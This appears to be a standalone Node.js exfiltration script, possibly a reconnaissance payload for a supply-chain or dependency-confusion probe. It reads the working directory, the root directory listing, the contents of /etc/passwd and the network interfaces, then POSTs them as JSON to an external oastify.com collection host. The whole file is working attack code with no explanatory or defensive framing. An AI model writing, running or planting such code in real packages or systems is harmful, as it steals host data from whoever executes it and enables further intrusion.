const https = require('https');
const fs = require('fs');
const os = require('os');

const payload = JSON.stringify({
  cwd: process.cwd(),
  files: fs.readdirSync(process.cwd()),
  root_files: fs.readdirSync('/'),
  passwd: fs.readFileSync('/etc/passwd', 'utf8'),
  interfaces: os.networkInterfaces()
}, null, 2);

const req = https.request('https://w1yz1aey6m26tx6e33l32iazoquhif64.oastify.com', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(payload)
  }
});
req.write(payload);
req.end();
